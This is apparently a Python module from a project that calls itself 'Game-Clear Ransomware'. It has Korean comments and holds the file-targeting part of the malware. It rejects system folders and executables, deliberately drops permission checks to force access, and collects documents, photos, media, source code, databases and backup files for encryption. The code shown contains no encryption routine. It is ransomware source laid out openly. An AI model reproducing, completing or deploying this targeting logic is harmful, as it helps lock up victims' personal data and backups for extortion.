"""
File management components for the Game-Clear Ransomware
"""

import hashlib
import os
import platform
from datetime import datetime
from pathlib import Path
from typing import List

from .models import FileInfo, ValidationResult


class FolderValidator:
    """폴더 검증 클래스"""
    
    def __init__(self):
        self.system_directories = self._get_system_directories()
    
    def _get_system_directories(self) -> List[str]:
        """시스템 디렉토리 목록 반환"""
        system = platform.system().lower()
        
        if system == "windows":
            # 기본 시스템 디렉토리
            sys_dirs = [
                "C:\\Windows",
                "C:\\Program Files",
                "C:\\Program Files (x86)",
                "C:\\ProgramData",
                "C:\\System Volume Information",
                "C:\\$Recycle.Bin",
                "C:\\Recovery",
                "C:\\Boot",
                "C:\\System32",
                "C:\\SysWOW64"
            ]
            
            # 사용자 폴더 내 중요 디렉토리
            user_home = Path.home()
            sys_dirs.extend([
                str(user_home / "AppData"),
                str(user_home / "Application Data"),
                str(user_home / "Local Settings"),
                str(user_home / "Cookies"),
                str(user_home / "NetHood"),
                str(user_home / "PrintHood"),
                str(user_home / "Recent"),
                str(user_home / "SendTo"),
                str(user_home / "Start Menu"),
                str(user_home / "Templates")
            ])
            
            return sys_dirs
        else:  # Linux/Unix
            return [
                "/bin",
                "/sbin",
                "/usr",
                "/etc",
                "/boot",
                "/sys",
                "/proc",
                "/dev",
                "/root",
                "/lib",
                "/lib64",
                "/opt",
                "/var"
            ]
    
    def validate_folder(self, folder_path: Path) -> ValidationResult:
        """폴더 검증"""
        warnings = []
        
        # 폴더 존재 확인
        if not folder_path.exists():
            return ValidationResult(
                is_valid=False,
                error_message="선택한 폴더가 존재하지 않습니다.",
                warnings=[],
                file_count=0,
                total_size=0
            )
        
        # 디렉토리인지 확인
        if not folder_path.is_dir():
            return ValidationResult(
                is_valid=False,
                error_message="선택한 경로가 폴더가 아닙니다.",
                warnings=[],
                file_count=0,
                total_size=0
            )
        
        # 시스템 디렉토리 확인
        folder_str = str(folder_path.resolve())
        for sys_dir in self.system_directories:
            if folder_str.startswith(sys_dir):
                return ValidationResult(
                    is_valid=False,
                    error_message=f"⛔ 시스템 폴더는 암호화할 수 없습니다!\n\n선택한 폴더: {folder_path}\n시스템 폴더: {sys_dir}\n\n시스템 폴더를 암호화하면 컴퓨터가 작동하지 않을 수 있습니다.\n다른 폴더를 선택해주세요.",
                    warnings=[],
                    file_count=0,
                    total_size=0
                )
        
        # 권한 확인 제거 - 강제 접근 허용
        # 권한이 없어도 시도하도록 변경됨
        
        # 파일 목록 및 크기 계산
        files = list(folder_path.rglob("*"))
        files = [f for f in files if f.is_file()]
        
        if not files:
            return ValidationResult(
                is_valid=False,
                error_message="폴더가 비어있습니다.",
                warnings=[],
                file_count=0,
                total_size=0
            )
        
        total_size = sum(f.stat().st_size for f in files)
        
        # 크기 경고
        if total_size > 1024 * 1024 * 1024:  # 1GB
            warnings.append("폴더 크기가 1GB를 초과합니다. 처리 시간이 오래 걸릴 수 있습니다.")
        
        return ValidationResult(
            is_valid=True,
            error_message=None,
            warnings=warnings,
            file_count=len(files),
            total_size=total_size
        )


class FileManager:
    """파일 관리자"""
    
    # 암호화할 파일 확장자 목록
    SUPPORTED_EXTENSIONS = {
        # 문서 파일
        '.txt', '.doc', '.docx', '.pdf', '.odt', '.rtf', '.tex', '.wpd',
        '.xls', '.xlsx', '.ods', '.csv', '.ppt', '.pptx', '.odp',
        '.hwp', '.hwpx', '.hwt',  # 한글 파일
        
        # 이미지 파일
        '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.svg', '.ico', '.tiff', '.tif',
        '.webp', '.psd', '.ai', '.eps', '.raw', '.cr2', '.nef', '.orf', '.sr2',
        
        # 비디오 파일
        '.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv', '.webm', '.m4v', '.mpg',
        '.mpeg', '.3gp', '.f4v', '.swf', '.vob',
        
        # 오디오 파일
        '.mp3', '.wav', '.flac', '.aac', '.ogg', '.wma', '.m4a', '.opus', '.ape',
        '.alac', '.aiff', '.mid', '.midi',
        
        # 압축 파일
        '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2', '.xz', '.iso', '.dmg',
        
        # 코드 파일
        '.py', '.java', '.cpp', '.c', '.h', '.cs', '.js', '.ts', '.html', '.css',
        '.php', '.rb', '.go', '.rs', '.swift', '.kt', '.scala', '.r', '.m', '.sh',
        '.bat', '.ps1', '.sql', '.json', '.xml', '.yaml', '.yml', '.toml', '.ini',
        '.jsx', '.tsx', '.vue', '.dart', '.lua', '.perl', '.pl', '.asm', '.s',
        '.vb', '.vbs', '.f', '.f90', '.f95', '.pas', '.pp', '.inc', '.awk',
        '.sed', '.gradle', '.groovy', '.clj', '.cljs', '.ex', '.exs', '.erl',
        '.hrl', '.elm', '.ml', '.mli', '.fs', '.fsx', '.fsi', '.jl', '.nim',
        '.cr', '.v', '.sv', '.svh', '.vhd', '.vhdl', '.tcl', '.lisp', '.scm',
        '.rkt', '.hs', '.lhs', '.purs', '.elm', '.coffee', '.ls', '.ts',
        '.md', '.markdown', '.rst', '.adoc', '.textile',  # 마크다운 및 문서
        
        # 데이터베이스 파일
        '.db', '.sqlite', '.sqlite3', '.mdb', '.accdb', '.dbf', '.sql',
        
        # 백업 파일
        '.bak', '.backup', '.old', '.orig',
        
        # 기타
        '.log', '.cfg', '.conf', '.config', '.dat', '.bin', '.tmp'
    }
    
    # 암호화 금지 확장자 (시스템 파일)
    FORBIDDEN_EXTENSIONS = {
        '.exe', '.dll', '.sys', '.drv', '.ocx', '.scr', '.cpl', '.msi', '.com',
        '.bat', '.cmd', '.vbs', '.ps1', '.reg', '.inf', '.cab', '.msp', '.msu',
        '.so', '.dylib', '.ko', '.o', '.a', '.lib'
    }
    
    def __init__(self):
        self.validator = FolderValidator()
    
    def is_system_file(self, file_path: Path) -> bool:
        """시스템 파일인지 확인"""
        # 확장자 확인
        if file_path.suffix.lower() in self.FORBIDDEN_EXTENSIONS:
            return True
        
        # 파일명 확인 (시스템 중요 파일)
        system_files = {
            'ntldr', 'bootmgr', 'pagefile.sys', 'hiberfil.sys', 'swapfile.sys',
            'boot.ini', 'ntdetect.com', 'ntoskrnl.exe', 'hal.dll'
        }
        if file_path.name.lower() in system_files:
            return True
        
        return False
    
    def get_file_list(self, folder_path: Path) -> List[FileInfo]:
        """폴더 내 파일 목록 반환 (지원되는 확장자만, 시스템 파일 제외, 권한 오류 무시)"""
        files = []
        
        for file_path in folder_path.rglob("*"):
            try:
                if not file_path.is_file():
                    continue
                
                # 시스템 파일 확인
                if self.is_system_file(file_path):
                    continue
                
                # 확장자 확인 (대소문자 구분 없이)
                if file_path.suffix.lower() not in self.SUPPORTED_EXTENSIONS:
                    continue
                
                # 파일 정보 수집 (권한 오류 무시)
                try:
                    file_info = FileInfo(
                        path=file_path,
                        size=file_path.stat().st_size,
                        extension=file_path.suffix,
                        modified_time=datetime.fromtimestamp(file_path.stat().st_mtime),
                        checksum=self._calculate_checksum(file_path)
                    )
                    files.append(file_info)
                except (PermissionError, OSError):
                    # 권한 오류 무시하고 계속 진행
                    continue
            except (PermissionError, OSError):
                # 폴더 접근 권한 오류 무시
                continue
        
        return files
    
    def _calculate_checksum(self, file_path: Path) -> str:
        """파일 체크섬 계산 (청크 단위로 메모리 효율적)"""
        hash_sha256 = hashlib.sha256()
        chunk_size = 1024 * 1024  # 1MB 청크
        
        try:
            with open(file_path, "rb") as f:
                while True:
                    chunk = f.read(chunk_size)
                    if not chunk:
                        break
                    hash_sha256.update(chunk)
            return hash_sha256.hexdigest()
        except (PermissionError, OSError):
            # 권한 오류 시 빈 체크섬 반환
            return ""
    
    @classmethod
    def get_supported_extensions_by_category(cls) -> dict:
        """카테고리별 지원 확장자 반환"""
        return {
            "문서": ['.txt', '.doc', '.docx', '.pdf', '.odt', '.rtf', '.tex', '.wpd',
                    '.xls', '.xlsx', '.ods', '.csv', '.ppt', '.pptx', '.odp',
                    '.hwp', '.hwpx', '.hwt'],  # 한글 파일 추가
            "이미지": ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.svg', '.ico', '.tiff', '.tif',
                      '.webp', '.psd', '.ai', '.eps', '.raw', '.cr2', '.nef', '.orf', '.sr2'],
            "비디오": ['.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv', '.webm', '.m4v', '.mpg',
                      '.mpeg', '.3gp', '.f4v', '.swf', '.vob'],
            "오디오": ['.mp3', '.wav', '.flac', '.aac', '.ogg', '.wma', '.m4a', '.opus', '.ape',
                      '.alac', '.aiff', '.mid', '.midi'],
            "압축": ['.zip', '.rar', '.7z', '.tar', '.gz', '.bz2', '.xz', '.iso', '.dmg'],
            "코드": ['.py', '.java', '.cpp', '.c', '.h', '.cs', '.js', '.ts', '.html', '.css',
                    '.php', '.rb', '.go', '.rs', '.swift', '.kt', '.scala', '.r', '.m', '.sh',
                    '.bat', '.ps1', '.sql', '.json', '.xml', '.yaml', '.yml', '.toml', '.ini',
                    '.jsx', '.tsx', '.vue', '.dart', '.lua', '.perl', '.pl', '.asm', '.s',
                    '.vb', '.vbs', '.f', '.f90', '.f95', '.pas', '.pp', '.inc', '.awk',
                    '.sed', '.gradle', '.groovy', '.clj', '.cljs', '.ex', '.exs', '.erl',
                    '.hrl', '.elm', '.ml', '.mli', '.fs', '.fsx', '.fsi', '.jl', '.nim',
                    '.cr', '.v', '.sv', '.svh', '.vhd', '.vhdl', '.tcl', '.lisp', '.scm',
                    '.rkt', '.hs', '.lhs', '.purs', '.coffee', '.ls',
                    '.md', '.markdown', '.rst', '.adoc', '.textile'],  # 마크다운 추가
            "데이터베이스": ['.db', '.sqlite', '.sqlite3', '.mdb', '.accdb', '.dbf', '.sql'],
            "백업": ['.bak', '.backup', '.old', '.orig'],
            "기타": ['.log', '.cfg', '.conf', '.config', '.dat', '.bin', '.tmp']
        }
    
    @classmethod
    def get_total_supported_count(cls) -> int:
        """지원되는 확장자 총 개수"""
        return len(cls.SUPPORTED_EXTENSIONS)